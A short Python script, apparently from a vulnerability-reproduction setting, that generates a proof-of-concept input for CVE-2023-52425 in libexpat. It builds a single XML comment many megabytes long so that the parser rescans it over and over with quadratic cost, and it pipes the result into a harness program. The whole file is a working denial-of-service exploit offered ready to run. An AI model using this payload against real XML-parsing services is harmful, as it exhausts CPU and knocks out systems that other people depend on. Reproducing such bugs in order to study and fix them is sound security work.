#!/usr/bin/env python3
# CVE-2023-52425  libexpat quadratic reparse (no reparse deferral < 2.6.0) PoC generator
# Usage: python3 gen_cve_2023_52425.py [MB] > input.txt ; time ./bfc < input.txt
# A single oversized COMMENT token cannot be finalized until '-->' is seen,
# so each 256-byte XML_Parse chunk reparses the whole token from the start -> O(n^2).
import sys
MB = int(sys.argv[1]) if len(sys.argv) > 1 else 16
n = MB * 1024 * 1024
xml = "<r><!--" + ("A" * n) + "--></r>"
sys.stdout.write("\n".join(["1", "1", xml, ".", "0", "3", "1", "0", "0"]) + "\n")
